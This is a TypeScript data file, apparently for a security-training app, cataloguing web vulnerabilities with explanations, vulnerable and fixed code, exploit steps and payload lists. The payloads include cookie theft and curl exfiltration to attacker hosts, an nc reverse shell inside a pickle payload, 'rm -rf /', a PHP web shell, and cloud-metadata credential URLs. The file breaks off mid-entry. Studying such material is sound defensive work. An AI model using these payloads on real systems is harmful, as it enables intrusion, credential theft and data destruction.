import { Vulnerability } from '../types';

export const INITIAL_VULNERABILITIES: Vulnerability[] = [
  {
    id: 'sqli',
    category: 'web-api',
    name: 'SQL Injection (SQLi)',
    cwe_id: 'CWE-89',
    severity: 'Critical',
    environment: 'Web Application / Databases',
    technical_explanation: 'Attacker injects untrusted SQL code directly into queries. This happens when input concatenation is used instead of parameterized queries or prepared statements, allowing the database engine to interpret user input as structured instructions.',
    vulnerable_code_snippet: `// VULNERABLE: Direct string interpolation of user input into raw SQL query
const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\`;
db.query(query, (err, result) => {
  // Return result
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `' OR 1=1 --`,
    remediation: 'Use Prepared Statements (Parameterized Queries) or Object Relational Mapping (ORM) tools. Never concatenate user input directly into executable SQL statements.',
    remediation_code_snippet: `// SECURED: Using parameterized query placeholders to segregate query structure from data
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.execute(query, [username, password], (err, result) => {
  // Safe execution
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate query-based inputs such as search bars or login fields.',
      'Inject a single quote (\') to break the query syntax and trigger database errors.',
      'Inject SQL control sequences, e.g., "\' OR 1=1 --", forcing the statement to evaluate to true.',
      'Leverage UNION queries or blind SQL payloads to extract arbitrary tables, users, or admin controls.'
    ],
    payloads: [
      {
        title: "Tautology Auth Bypass",
        type: "Auth Bypass",
        payload: "' OR '1'='1",
        description: "Bypasses standard login authentication checks by forcing the SQL WHERE command clause to evaluate to true."
      },
      {
        title: "Comment Character Query Truncation",
        type: "Syntax Breakout",
        payload: "' OR 1=1 -- -",
        description: "Closes the dynamic variable assignment quotation and comments out all remaining SQL instructions (safe for MySQL/SQLite)."
      },
      {
        title: "UNION Schema Enumeration",
        type: "UNION-Based",
        payload: "' UNION SELECT 1, null, table_name, null FROM information_schema.tables --",
        description: "Combines the default query result with custom record rows returned from information schema, revealing database table directories."
      },
      {
        title: "Time-Based Blind Delay",
        type: "Blind SQLi",
        payload: "admin' AND (SELECT 9553 FROM (SELECT(SLEEP(5)))yVbw) --",
        description: "Triggers execution thread sleeps of exactly 5 seconds if the condition is true. Used to infer database characters bit-by-bit."
      },
      {
        title: "Error-Based Version Extraction",
        type: "Error-Based",
        payload: "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1) --",
        description: "Forces MySQL to trigger an error reporting diagnostic exception container displaying the output of version() inline."
      },
      {
        title: "Stacked Query Execution",
        type: "Stacked Queries",
        payload: "admin'; INSERT INTO audit_logs (level, comment) VALUES ('critical', 'compromised'); --",
        description: "Appends secondary distinct executable statements sequentially on engines where stack queries are supported (e.g. PostgreSQL/MSSQL)."
      }
    ]
  },
  {
    id: 'xss',
    category: 'web-api',
    name: 'Cross-Site Scripting (XSS)',
    cwe_id: 'CWE-79',
    severity: 'High',
    environment: 'Client-Side browsers / Frontend',
    technical_explanation: 'Allows attackers to inject malicious client-side JavaScript into web pages viewed by other users. Types include: Stored (stored in database), Reflected (reflected via query parameters), and DOM-based (improper processing of variables in local JS scripts).',
    vulnerable_code_snippet: `<!-- VULNERABLE: Directly injecting user parameter into HTML without escaping -->
<div id="greeting">
  Hello, <%= request.getParameter("name") %>!
</div>`,
    vulnerable_code_lang: 'html',
    payload_example: `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`,
    remediation: 'Sanitize and content-escape all user input before outputting it. Restrict DOM manipulation using secure React components or DOMPurify, and apply a strong Content Security Policy (CSP).',
    remediation_code_snippet: `<!-- SECURED: Escaping dynamic text or using framework binding that encodes by default -->
<div id="greeting">
  Hello, <%= HTMLEscape(request.getParameter("name")) %>!
</div>`,
    remediation_code_lang: 'html',
    exploit_steps: [
      'Identify reflecting parameters (e.g., /search?q=XYZ) or comments stored in a database.',
      'Inject basic HTML tags like "<u>test</u>" to check if the browser parses raw HTML.',
      'Inject a JavaScript executable tag or attribute payload like "<img src=x onerror=alert(1)>".',
      'The browser executes the JavaScript under the security context of the victim\'s session.'
    ],
    payloads: [
      {
        title: "Classic Executable Vector Tag",
        type: "Filter Refinement",
        payload: "<script>alert(document.domain)</script>",
        description: "Triggers a proof-of-concept alert dialog carrying the current domain context on unescaped dynamic outputs."
      },
      {
        title: "Blind Image Error Handler",
        type: "Event-Handler",
        payload: "<img src=x onerror=alert(document.cookie)>",
        description: "Safely bypasses simple regular expression filters matching raw script tags by binding JS code directly inside image fallback exceptions."
      },
      {
        title: "Inline SVG Vector trigger",
        type: "HTML5/XML",
        payload: "<svg onload=alert('XSS')>",
        description: "Executes client script immediately inside nested vector graphic elements, useful when traditional HTML body filters are active."
      },
      {
        title: "Clickable Link Protocol Action",
        type: "URI Scheme",
        payload: "javascript:alert(1)",
        description: "Injects actionable code into click elements containing href parameters, executing as soon as user clicks the element."
      },
      {
        title: "Obfuscated Backslash Charcode Execution",
        type: "Obfuscated",
        payload: "<iframe src=javascript:alert(String.fromCharCode(88,83,83))></iframe>",
        description: "Evades signature based web application firewalls (WAF) by expressing standard string vectors in abstract decimal character codes."
      }
    ]
  },
  {
    id: 'csrf',
    category: 'web-api',
    name: 'Cross-Site Request Forgery (CSRF)',
    cwe_id: 'CWE-352',
    severity: 'Medium',
    environment: 'Web Sessions / APIs',
    technical_explanation: 'Forces a logged-in user to execute unwanted actions on a web application in which they are currently authenticated. It exploits the trust a site has in the user\'s browser automatically supplying cookies for requests to that origin.',
    vulnerable_code_snippet: `<!-- VULNERABLE: A state-changing endpoint that executes bare GET/POST with cookies but no tokens -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="recipient_acc">
</form>`,
    vulnerable_code_lang: 'html',
    payload_example: `<img src="https://bank.com/transfer?amount=1000&to=attacker" style="display:none;" />`,
    remediation: 'Implement anti-CSRF tokens (unique, stateful, cryptographically secure nonces) for state-changing requests, and configure cookies with "SameSite=Strict" or "SameSite=Lax".',
    remediation_code_snippet: `<!-- SECURED: Including an anti-CSRF token validated by the server -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="c839d0fb4bf2e89d13f">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="recipient_acc">
</form>`,
    remediation_code_lang: 'html',
    exploit_steps: [
      'An authenticated victim logs into their trusted site (e.g., bank.com) and holds a valid session cookie.',
      'The victim is tricked into visiting a malicious platform hosting the CSRF payload.',
      'The attacker\'s site triggers an automatic background submission (e.g., hidden forms, images) to bank.com.',
      'The victim\'s browser attaches validation cookies automatically, causing the action (transfer, password change) to execute.'
    ],
    payloads: [
      {
        title: "GET Action Trigger Image Vector",
        type: "Invisible GET",
        payload: "<img src=\"https://bank.com/transfer?amount=5000&to=attacker_id\" style=\"display:none;\" />",
        description: "Triggers a silent background transaction immediately as soon as a victim visits the attacker's HTML portal, utilizing automatic cookie attachments."
      },
      {
        title: "Self-Submitting Form POST Injection",
        type: "Form POST",
        payload: `<form id="csrfForm" action="https://bank.com/api/settings" method="POST">\n  <input type="hidden" name="email" value="attacker@compromised.org" />\n</form>\n<script>document.getElementById('csrfForm').submit();</script>`,
        description: "Silently routes state-changing POST endpoints under the active target context to switch the victim's primary profile settings."
      }
    ]
  },
  {
    id: 'ssrf',
    category: 'cloud-security',
    name: 'Server-Side Request Forgery (SSRF)',
    cwe_id: 'CWE-918',
    severity: 'High',
    environment: 'Cloud / Internal Networks / APIs',
    technical_explanation: 'The attacker tricks the vulnerable server into making HTTP/TCP requests to arbitrary, internal, or cloud-infrastructure resources. It allows accessing loopback interfaces (localhost), internal firewalled networks, or cloud metadata endpoints like AWS IMDSv1.',
    vulnerable_code_snippet: `// VULNERABLE: Instantly sending a fetch query to user-supplied URLs without validation
app.get('/api/scrape', async (req, res) => {
  const targetUrl = req.query.url;
  const content = await fetch(targetUrl);
  res.send(await content.text());
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    remediation: 'Implement robust IP allowlists, disable DNS resolution of private subnets (RFC 1918), use isolated proxy containers for scraping, and enforce IMDSv2 (session token header) inside AWS cloud configurations.',
    remediation_code_snippet: `// SECURED: Whitelisting specific domain names, preventing network requests to loopback or private ranges
const ALLOWED_DOMAINS = ['trusted-partner.com', 'api.service.com'];

app.get('/api/scrape', async (req, res) => {
  const targetUrl = new URL(req.query.url);
  if (!ALLOWED_DOMAINS.includes(targetUrl.hostname)) {
    return res.status(403).send("Domain forbidden");
  }
  const content = await fetch(targetUrl.href);
  res.send(await content.text());
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate properties where the server fetches images, templates, or files from dynamic third-party URLs.',
      'Replace the URL parameter with an internal resource (e.g., "http://localhost:8080/admin" or "http://127.0.0.1").',
      'Target Cloud Instance Metadata services (like AWS/GCP 169.254.169.254) to leak private security/session tokens.',
      'Enumerate local subnet ranges to scan active services through the server\'s localized network.'
    ],
    payloads: [
      {
        title: "AWS Cloud IMDSv1 Security Leaks",
        type: "Cloud Metadata",
        payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role",
        description: "Fetches AWS temporary node security keys and security-credentials from standard non-authenticated link-local addresses."
      },
      {
        title: "GCP GCP-Metadata Access Header Query",
        type: "GCP Metadata",
        payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        description: "Requests local active access credentials inside Google Cloud server-node environments."
      },
      {
        title: "Localhost Loopback Sweep Integration",
        type: "Local Loopback",
        payload: "http://127.0.0.1:8080/admin/debug/status",
        description: "Scans localhost endpoints to access internal back-office admin nodes normally firewalled from outside access."
      },
      {
        title: "Decimal Encoded Localhost bypass",
        type: "Bypass Filters",
        payload: "http://2130706433/etc/security_manifest",
        description: "Rewrites loopback 127.0.0.1 in integer format to evade naive string filters parsing hostnames."
      }
    ]
  },
  {
    id: 'command-injection',
    category: 'server-os',
    name: 'Command Injection',
    cwe_id: 'CWE-78',
    severity: 'Critical',
    environment: 'Server host / Operating Systems',
    technical_explanation: 'The application executes unsafe OS shell commands containing concatenated user inputs. This enables custom operating system instructions to slip inline with the program\'s target console routine.',
    vulnerable_code_snippet: `# VULNERABLE: Appending unvalidated parameters directly into an OS system command execution
import os

def ping_host(user_ip):
    # Attacker can chain commands using terminal separators (&&, ;, |)
    os.system(f"ping -c 3 {user_ip}")`,
    vulnerable_code_lang: 'python',
    payload_example: `8.8.8.8 && whoami && cat /etc/passwd`,
    remediation: 'Avoid system shell executors entirely. Use native programming language library APIs (like child_process.execFile, subprocess with arrays, etc.) to invoke processes with explicit, pre-tokenized arguments.',
    remediation_code_snippet: `# SECURED: Utilizing tokenized, non-shell arguments containing explicitly restricted parameters
import subprocess

def ping_host(user_ip):
    # Subprocess bypasses shell interpretation when shell=False (default behavior)
    result = subprocess.run(["ping", "-c", "3", user_ip], capture_output=True, text=True, shell=False)
    return result.stdout`,
    remediation_code_lang: 'python',
    exploit_steps: [
      'Identify functionalities invoking OS binaries (e.g. system pings, document converters, image compression tools).',
      'Inject common OS Shell operators like "&&", ";", "|", or "\`\`" alongside valid characters.',
      'Run commands like "whoami" or "id" to monitor if the response or delay reveals command execution.',
      'Establish a reverse shell connection (e.g., via bash/nc) back to an attacker-controlled listener.'
    ],
    payloads: [
      {
        title: "Semicolon Sequence Command Chain",
        type: "Unix Sequence",
        payload: "; whoami; id",
        description: "Executes the secondary command immediately after the primary process completes, irrespective of whether the original instruction succeeded."
      },
      {
        title: "Conditional AND Execution Control",
        type: "Logical Chain",
        payload: "&& cat /etc/passwd",
        description: "Enforces secondary instruction evaluation only if the target original utility returns a successful 0 exit code."
      },
      {
        title: "Inline Backtick Subshell Substitution",
        type: "Subshell Substr",
        payload: "`id`",
        description: "Interpolates the inner terminal command stdout directly inside the main application prompt parameters list."
      },
      {
        title: "POSIX modern Dollar-Paren Substitution",
        type: "Subshell Substr",
        payload: "$(uname -a)",
        description: "Utilizes the modern POSIX subshell interpreter to inject dynamic diagnostic listings in string interpolation targets."
      },
      {
        title: "Pipe-Output Traffic Manipulation",
        type: "Pipeline Redirection",
        payload: "| curl http://attacker-analytics.com/harvest?data=`whoami`",
        description: "Pipes the command stream outwards to an attacker-controlled telemetry interface for blind exfiltration."
      },
      {
        title: "Windows CLI background chaining operator",
        type: "Windows Command",
        payload: "& whoami & dir",
        description: "Triggers Windows CMD shell instructions concurrently alongside normal host application queries."
      }
    ]
  },
  {
    id: 'file-upload',
    category: 'server-os',
    name: 'File Upload Vulnerabilities',
    cwe_id: 'CWE-434',
    severity: 'Critical',
    environment: 'Filesystem / Reverse Proxy / Cloud Clusters',
    technical_explanation: 'Uploading malicious, executable files (such as .php, .jsp, or .asp scripts) into directories served by the web application. When subsequently called, the web server executes these files, granting arbitrary remote console access.',
    vulnerable_code_snippet: `// VULNERABLE: Trusting the client's file name extension entirely and keeping upload path web-accessible
const multer = require('multer');
const upload = multer({ dest: 'public/uploads/' });

app.post('/profile', upload.single('avatar'), (req, res) => {
  // Directly saves files in public directory as original web extensions
  renameFile(req.file.path, 'public/uploads/' + req.file.originalname);
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `Filename: shell.php | Content: <?php system($_GET['cmd']); ?>`,
    remediation: 'Upload assets directly to isolated, non-executable content networks (e.g., AWS S3). If stored locally, randomize filenames, restrict extensions using rigorous server-side mime-type checks, and run files outside the active document root.',
    remediation_code_snippet: `// SECURED: Enforcing strict mime-type validation and storing files with randomized keys
const path = require('path');
const uuid = require('uuid');

const fileFilter = (req, file, cb) => {
  const allowedMime = ['image/jpeg', 'image/png', 'image/gif'];
  if (allowedMime.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Invalid file type!'), false);
  }
};

const storage = multer.diskStorage({
  destination: '/var/non_web_storage/', // Directory NOT served directly by Web server
  filename: (req, file, cb) => {
    cb(null, uuid.v4() + path.extname(file.originalname)); // Generate safe UUID
  }
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate profiles, portfolio attachments, or image upload elements.',
      'Upload a web executable script (e.g., "shell.php" or "webshell.aspx") containing RCE commands.',
      'If frontend-filters block it, intercept the raw HTTP request using a proxy tool to rename files.',
      'Identify the target storage path, make an HTTP request to the uploaded file, and gain server shell command controls.'
    ],
    payloads: [
      {
        title: "Basic Web Shell Payload (PHP)",
        type: "Web Shell",
        payload: "<?php system($_GET['cmd']); ?>",
        description: "A single-line PHP backdoor that accepts commands via the 'cmd' GET parameter."
      },
      {
        title: "Null-Byte Extension Bypass (PHP < 5.3)",
        type: "Bypass Extension",
        payload: "shell.php%00.png",
        description: "Appends a null-byte to truncate trailing extensions in legacy systems, tricking filters into seeing an image extension."
      },
      {
        title: "Double Extension Obfuscation",
        type: "Bypass Extension",
        payload: "webshell.php.png",
        description: "Exploits Apache misconfigurations where files are processed from left to right if specific extensions are unmapped."
      }
    ]
  },
  {
    id: 'path-traversal',
    category: 'server-os',
    name: 'Path Traversal / Directory Traversal',
    cwe_id: 'CWE-22',
    severity: 'High',
    environment: 'Servers / Filesystem Storage',
    technical_explanation: 'Tricking an application into reading or writing files outside its designated web storage root folder. Attackers utilize dot-dot-slash ("../") escape patterns to climb the system directory tree.',
    vulnerable_code_snippet: `// VULNERABLE: Direct concatenation of dynamic user string into a readfile path call
app.get('/files', (req, res) => {
  const file = req.query.name;
  res.sendFile(\`/var/www/public/files/\${file}\`);
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `../../../../etc/passwd`,
    remediation: 'Perform strict filename-only validation, isolate storage folders via secure containers, or map filenames to pre-allocated database keys instead of raw paths.',
    remediation_code_snippet: `// SECURED: Resolving base directories to double check for unexpected filesystem climbs
const path = require('path');

app.get('/files', (req, res) => {
  const file = req.query.name;
  const safePath = path.resolve('/var/www/public/files/', file);
  
  // Guard clause checking if resolved path still contains target root prefix
  if (!safePath.startsWith('/var/www/public/files/')) {
    return res.status(403).send("Access Denied");
  }
  res.sendFile(safePath);
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate query parameters that fetch static template documents or download images (e.g. download.php?file=logo.png).',
      'Replace the filename with simple directory traversal escapes: "../../../etc/passwd" (on UNIX) or "..\\\\..\\\\..\\\\Windows\\\\win.ini" (on Windows).',
      'Gain exposure to sensitive environment configurations like web application source code or session databases.'
    ],
    payloads: [
      {
        title: "Standard UNIX Password Access",
        type: "UNIX Read",
        payload: "../../../../etc/passwd",
        description: "Climbs structural directories to read the local non-shadowed user account directory."
      },
      {
        title: "Standard Windows Host Verification",
        type: "Windows Read",
        payload: "..\\..\\..\\..\\..\\..\\Windows\\win.ini",
        description: "Uses backslash escape configurations to retrieve default active Win ini files on IIS hosts."
      },
      {
        title: "URL Encoded Dot-Dot-Slash",
        type: "Bypass Filters",
        payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        description: "Bypasses legacy signature-based web sanitizers by URL encoding traversal sequences."
      }
    ]
  },
  {
    id: 'broken-access-control',
    category: 'web-api',
    name: 'Broken Access Control (IDOR / BOLA)',
    cwe_id: 'CWE-639',
    severity: 'High',
    environment: 'APIs / Client-Side Navigation',
    technical_explanation: 'Occurs when users access, modify, or delete resources they shouldn\'t due to missing server-side authorization checks. Also known as Insecure Direct Object References (IDOR) or Broken Object Level Authorization (BOLA).',
    vulnerable_code_snippet: `// VULNERABLE: Executes request solely relying on entity value provided by arbitrary client ID
app.get('/api/invoice/:id', async (req, res) => {
  const invoice = await Invoice.findById(req.params.id);
  // CRITICAL FAIL: Returns target data without verifying if this belongs to logged-in session user
  res.json(invoice);
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `Request: GET /api/invoice/1002 (When active user context is owner of ID 1001)`,
    remediation: 'Always authorize actions on the server-side. Validate that the logged-in session possesses legal privilege bounds over the target resource ID before returning or modifying items.',
    remediation_code_snippet: `// SECURED: Multi-level verification matching logged-in owner schema to resource mapping
app.get('/api/invoice/:id', async (req, res) => {
  const invoice = await Invoice.findById(req.params.id);
  if (!invoice) {
    return res.status(404).send("Invoice not found");
  }
  
  // Verification: Validating ownership boundary conditions
  if (invoice.userId !== req.session.userId) {
    return res.status(403).send("Access Denied: Unauthorized request");
  }
  res.json(invoice);
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Identify structured resource endpoints that leverage incremental or guessable index IDs (e.g., "/user/view?id=49").',
      'Change the parameter value to a neighboring index (e.g., id=48 or id=50).',
      'Observe whether the application serves cross-user private structures or records.'
    ],
    payloads: [
      {
        title: "Incremental Parameter ID Tampering",
        type: "IDOR",
        payload: "/api/users/1005/billing",
        description: "Manually alters numerical IDs in REST pathways to access invoicing parameters of other clients."
      },
      {
        title: "UUID / GUID Sequential Sweep",
        type: "BOLA",
        payload: "POST /api/v1/delete-account HTTP/1.1\\nHost: api.target.com\\n\\n{\\\"account_id\\\": \\\"9f28d8b2-5f60-11ed-9b6a-0242ac120002\\\"}",
        description: "Exploits exposed endpoint variables where structural delete operations are performed using UUIDs without checking authorization permissions."
      }
    ]
  },
  {
    id: 'rce',
    category: 'server-os',
    name: 'Remote Code Execution (RCE)',
    cwe_id: 'CWE-94',
    severity: 'Critical',
    environment: 'Host Infrastructure / Middleware',
    technical_explanation: 'Arises from flaws such as unpatched deserialization routines, unchecked upload execution structures, or template runtime injection. It allows the execution of arbitrary commands directly on the server.',
    vulnerable_code_snippet: `// VULNERABLE: Using eval() on dynamic deserialized strings
const userProfile = req.body.profile;
// Passing user strings into eval executes active javascript code in runtime node thread
const parsedDoc = eval("(" + userProfile + ")");`,
    vulnerable_code_lang: 'javascript',
    payload_example: `require('child_process').execSync('rm -rf /')`,
    remediation: 'Avoid evaluating code dynamically via eval() or system builders. Strictly implement rigid parser specifications (like standard, native JSON.parse) and keep framework modules updated.',
    remediation_code_snippet: `// SECURED: Relying purely on standardized, non-executable data serializers like native JSON parsers
const userProfile = req.body.profile;
const parsedDoc = JSON.parse(userProfile);`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Audit applications for input paths parsed as dynamic frameworks (e.g. Java serialization interfaces, template blocks).',
      'Construct a payload encapsulating systemic binary execution tasks (e.g. system commands, bash commands).',
      'Submit payload, leading to structural code execution within the vulnerable web server engine.'
    ],
    payloads: [
      {
        title: "Node.JS Child Process Execution",
        type: "RCE Payload",
        payload: "require('child_process').execSync('whoami').toString()",
        description: "Invokes operating system shell utilities synchronously using standard native Node runtime libraries."
      },
      {
        title: "Python Subprocess Remote Command",
        type: "RCE Payload",
        payload: "__import__('subprocess').check_output(['id']).decode()",
        description: "Leverages dynamic imports in Python to access subprocess commands without explicit module declarations."
      }
    ]
  },
  {
    id: 'insecure-deserialization',
    category: 'server-os',
    name: 'Insecure Deserialization',
    cwe_id: 'CWE-502',
    severity: 'High',
    environment: 'Application Backend Engines (Java, PHP, Node.js)',
    technical_explanation: 'Occurs when applications unserialize untrusted data supplied by hackers without verification. Attackers exploit object construction structures to hijack memory threads, leading to RCE.',
    vulnerable_code_snippet: `// VULNERABLE (PHP): Unserializing cookie inputs directly without check
$user_data = unserialize($_COOKIE['session_token']);`,
    vulnerable_code_lang: 'php',
    payload_example: `O:8:"MyObject":1:{s:11:"file_delete";s:12:"/etc/hosts";}`,
    remediation: 'Never parse raw serialized object bodies from remote layers. Prefer low-privilege data-only schemas (like JSON, Protocol Buffers, or XML with schema-strict parsers).',
    remediation_code_snippet: `// SECURED: Exclusively exchange data using standard, code-safe JSON schemas
$user_data = json_decode($_COOKIE['session_token'], true);`,
    remediation_code_lang: 'php',
    exploit_steps: [
      'Identify structured serial data passed key-by-value inside Cookies or state headers.',
      'Reverse engineer server properties to locate class hooks or method calls auto-executed during instantiations.',
      'Inject payload blocks packing structural values that leverage destructors to execute arbitrary operations.'
    ],
    payloads: [
      {
        title: "PHP Custom Class Destruction Bypass",
        type: "Object Injection",
        payload: "O:11:\"LoggerAgent\":1:{s:8:\"log_file\";s:19:\"/var/www/html/r.php\";}",
        description: "Injects definitions to force file writes onto active web directories when PHP cleans up class configurations."
      },
      {
        title: "Python Pickle Execution Payload",
        type: "Pickle Exploit",
        payload: "cos\\nsystem\\n(S'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f'\\ntR.",
        description: "An instruction-based string stack that forces systemic command imports during standard Pickle loads."
      }
    ]
  },
  {
    id: 'xxe',
    category: 'server-os',
    name: 'XML External Entity (XXE)',
    cwe_id: 'CWE-611',
    severity: 'High',
    environment: 'XML Parser Interfaces / Systems',
    technical_explanation: 'Arises when weak XML processing configurations resolve dynamic external entity declarations. Attackers override XML blueprints to pull files, invoke network SSRF processes, or crash backend parsers (Billion Laughs Denial-of-Service).',
    vulnerable_code_snippet: `<!-- VULNERABLE (XML): Embedding system links directly in entity definitions -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>`,
    vulnerable_code_lang: 'xml',
    payload_example: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`,
    remediation: 'Configure XML parsers to completely disable External Entity Resolution (DTD, external entities) within code operations.',
    remediation_code_snippet: `// SECURED (Java): Disabling external entity configuration features in parser
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);`,
    remediation_code_lang: 'java',
    exploit_steps: [
      'Locate API endpoints parsing structured XML data payloads.',
      'Construct a nested DOCTYPE block containing systemic ENTITY hooks pointing to local filesystem files.',
      'Call the defined entity reference within the XML message body, causing the parsed output to return local configuration keys.'
    ],
    payloads: [
      {
        title: "Arbitrary UNIX Password Dump",
        type: "Local Read",
        payload: "<?xml version=\"1.0\"?>\\n<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\\n<query>&xxe;</query>",
        description: "Tricks the parser into retrieving UNIX users files directly within server responses."
      },
      {
        title: "Billion Laughs Denial of Service",
        type: "XML DoS",
        payload: "<?xml version=\"1.0\"?>\\n<!DOCTYPE lolz [\\n <!ENTITY lol \"lol\">\\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\\n <!-- ... up to lol9 ... -->\\n]>\\n<lolz>&lol9;</lolz>",
        description: "Exponentially expands nested entity definitions to exhaust system hardware memory limits and crash standard servers."
      }
    ]
  },
  {
    id: 'clickjacking',
    category: 'web-api',
    name: 'Clickjacking',
    cwe_id: 'CWE-451',
    severity: 'Medium',
    environment: 'Bridges / iFrame security',
    technical_explanation: 'Forces users to perform actions on a target web application unknowingly by wrapping it inside an invisible inline frame overlay (invisible iframe) displayed on an attacker\'s page.',
    vulnerable_code_snippet: `<!-- VULNERABLE: Lacks anti-framing rules, allowing wrapping under any attacker's page -->
<html>
  <body>
    <!-- Malicious click trigger overlay placed on top of target server -->
    <iframe src="https://vulnerable-bank.com/transfer" style="opacity: 0.0; position: absolute; z-index: 2;"></iframe>
    <button style="position: absolute; top: 100px; left: 100px;">Click to win $1000!</button>
  </body>
</html>`,
    vulnerable_code_lang: 'html',
    payload_example: `iFrame opacity set to 0.0 overlaying on top of clickable phishing elements`,
    remediation: 'Configure HTTP response headers with "X-Frame-Options: DENY" or enforce fine-grained frame boundaries using a Content Security Policy (CSP) directive "frame-ancestors \'none\'".',
    remediation_code_snippet: `// SECURED (Express Node.js): Activating headers prohibiting iframe inclusions
app.use((req, res, next) => {
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Content-Security-Policy", "frame-ancestors 'none'");
  next();
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Verify if a sensitive target application page permits being embedded inside third-party iframes.',
      'Create a malicious webpage styled with CSS positioning rules placing an invisible (opacity:0) frame representing the target transaction page on top of attractive reward buttons.',
      'Trick the user into clicking, causing actions (like money transfers or credential toggles) to trigger on the target.'
    ],
    payloads: [
      {
        title: "Transparent Framing Harness",
        type: "CSS Wrapper",
        payload: "<iframe src=\"https://target.com/settings\" style=\"width:500px; height:500px; opacity:0; pointer-events:auto; position:absolute; z-index:10;\"></iframe>",
        description: "Creates an invisible frame positioned precisely over target components to steal user mouse click inputs."
      }
    ]
  },
  {
    id: 'open-redirect',
    category: 'web-api',
    name: 'Open Redirect',
    cwe_id: 'CWE-601',
    severity: 'Medium',
    environment: 'APIs / Navigation workflows',
    technical_explanation: 'Tricks users into navigating away to malicious platforms by utilizing unvalidated user parameters within redirection endpoints. Commonly used to facilitate OAuth token leakage and phishing.',
    vulnerable_code_snippet: `// VULNERABLE: Blindly trusting the destination parameter value to perform redirection
app.get('/login', (req, res) => {
  const nextTarget = req.query.redirect_url;
  res.redirect(nextTarget); // Attacker overrides redirect_url=http://phishing.com
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `/login?redirect_url=http://attacker-controlled-site.com`,
    remediation: 'Restrict redirection to local paths using regex checking or resolve paths against strict domain allowlists.',
    remediation_code_snippet: `// SECURED: Restricted redirection allowing folder paths or relative routes only
app.get('/login', (req, res) => {
  const nextTarget = req.query.redirect_url;
  
  // Guard clause restricting target destinations to relative formats beginning with "/"
  if (nextTarget.startsWith('/') && !nextTarget.startsWith('//')) {
    res.redirect(nextTarget);
  } else {
    res.redirect('/dashboard'); // Safe fallback
  }
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate query parameters driving page directions (e.g. login.aspx?return=dashboard.aspx).',
      'Change parameters to arbitrary urls pointing outwards, monitoring if the system transfers navigation blindly.',
      'Incorporate payloads inside phishing campaigns to capture authenticated victims under simulated dashboards.'
    ],
    payloads: [
      {
        title: "External Domain Redirect Hook",
        type: "Query Param",
        payload: "?next=https://attacker-controlled.org/login-login",
        description: "A redirection bypass targeting applications using unvalidated navigation variables."
      },
      {
        title: "Slash-Bypass Unicode Obfuscation",
        type: "Validation Bypass",
        payload: "?next=//attacker-site.org",
        description: "Bypasses standard starting slash validations inside badly configured security routines by referencing dynamic schemeless absolute links."
      }
    ]
  },
  {
    id: 'information-disclosure',
    category: 'web-api',
    name: 'Information Disclosure / Sensitive Data Exposure',
    cwe_id: 'CWE-200',
    severity: 'Medium',
    environment: 'API / Server Debug interfaces',
    technical_explanation: 'Leaking backend technical configuration states, framework models, API stack traces, or credentials in client responses.',
    vulnerable_code_snippet: `// VULNERABLE: Passing raw, unhandled database stack errors direct to the browser
app.get('/data', (req, res) => {
  db.query("SELECT * FROM sensitive", (err, data) => {
    if (err) {
      // DANGEROUS: Leaks system database drivers path, directories, and tables
      return res.status(500).json({ error: err.stack });
    }
    res.json(data);
  });
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `Stacktrace: Exception in thread "main" java.sql.SQLException: Access denied for user 'root'@'10.x...'`,
    remediation: 'Configure centralized error-handling processes on the backend. Log errors on the server, and return simple, non-descriptive error states to public users.',
    remediation_code_snippet: `// SECURED: Masking detailed debug information with abstract generic API status summaries
app.get('/data', (req, res) => {
  db.query("SELECT * FROM sensitive", (err, data) => {
    if (err) {
      console.error("Database Trace: ", err); // Log internally
      return res.status(500).json({ error: "An unexpected error occurred. Reference ID: ERR_902" });
    }
    res.json(data);
  });
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Trigger system errors using invalid inputs, unexpected parameters, or custom formatting types.',
      'Check page headers or body feedback for technical database metadata, stack paths, or debug outputs.',
      'Parse exposed information to discover specific backend middleware languages and draft targeted exploits.'
    ],
    payloads: [
      {
        title: "Trigger Developer Trace Debugger",
        type: "Error Trigger",
